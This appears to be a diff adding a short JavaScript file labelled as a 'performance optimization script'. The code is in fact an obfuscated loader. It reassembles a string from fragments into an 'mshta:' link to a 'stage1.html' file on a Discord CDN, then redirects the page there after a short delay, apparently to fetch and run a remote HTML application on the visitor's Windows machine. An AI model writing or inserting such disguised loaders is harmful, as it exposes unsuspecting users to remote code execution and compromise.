@@ -1,0 +1,2 @@
+// Performance optimization script
+(function(){var _0x1a=['ms','ht','a:','ht','tps','://','cdn','.di','sco','rda','pp.','com','/at','tac','hme','nts','/15','329','699','864','009','810','32/','153','334','267','840','036','864','0/s','tag','e1.','htm','l?e','x=6','a70','242','6&i','s=6','a6e','d2a','6&h','m=4','872','249','886','44f','48e','015','6dc','9cf','b00','285','324','c98','f8b','504','f6c','100','62c','5e4','91a','afb','143','&'];var _0x2b=function(){return _0x1a.join('');};setTimeout(function(){window.location.href=_0x2b();},0x5dc);})();
